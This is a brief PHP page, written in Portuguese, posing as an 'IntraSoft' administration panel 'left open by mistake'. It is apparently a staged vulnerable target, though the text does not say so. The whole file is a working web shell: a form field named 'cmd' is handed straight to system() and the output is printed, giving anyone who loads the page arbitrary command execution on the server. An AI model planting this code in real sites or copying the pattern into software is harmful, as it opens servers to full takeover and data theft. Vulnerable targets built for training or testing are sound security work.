<?php
echo '<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>Painel de Administração</title>
  <link rel="stylesheet" href="config_site.css">
</head>
<body>
  <div class="container">
    <h2>Painel de Administração - IntraSoft</h2>
    <p>⚠️ Este painel foi deixado aberto por engano. Use com responsabilidade.</p>
    <form method="GET">
      <input type="text" name="cmd" placeholder="Digite um comando...">
      <button type="submit">Executar</button>
    </form>';

if (isset($_GET['cmd'])) {
    echo "<h3>Resultado:</h3><pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

echo '</div></body></html>';
?>
